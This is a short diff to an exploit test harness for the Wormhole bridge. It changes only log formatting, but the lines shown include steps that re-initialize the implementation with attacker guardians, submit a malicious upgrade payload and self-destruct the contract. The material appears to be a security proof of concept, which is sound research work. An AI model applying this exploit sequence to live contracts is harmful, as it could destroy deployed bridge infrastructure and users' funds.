@@ -55,7 +55,7 @@ contract EvilWormhole {
 contract Destructor {
 
   function destruct() external {
-    console.log("[3] Self-destructing...");
+    console.log("\n[3] Self-destructing...");
     selfdestruct(payable(address(this)));
   }
 }
@@ -218,7 +218,7 @@ contract ExploitWormhole is TestHarness {
         size = codeSize(address(wormholeImpl));
         dumpCode(address(wormholeImpl), size);
 
-        console.log("[1] Re-initializing bridge to set attacker guardian...");
+        console.log("\n[1] Re-initializing bridge to set attacker guardian...");
         wormholeImpl.initialize(attackerAddresses, 0, 0, HASH_ZERO);
 
         bytes memory payload = buildPayload(address(evilWormhole));
@@ -235,8 +235,8 @@ contract ExploitWormhole is TestHarness {
         );
         vm = parseVM(_vm);
 
-        console.log("[2] Submitting malicious VM to upgrade the contract...");
-        console.logBytes(vm.payload);
+        console.log("\n[2] Submitting malicious VM to upgrade the contract...");
+        emit log_named_bytes("Payload", vm.payload);
         wormholeImpl.submitContractUpgrade(_vm);
     }
 
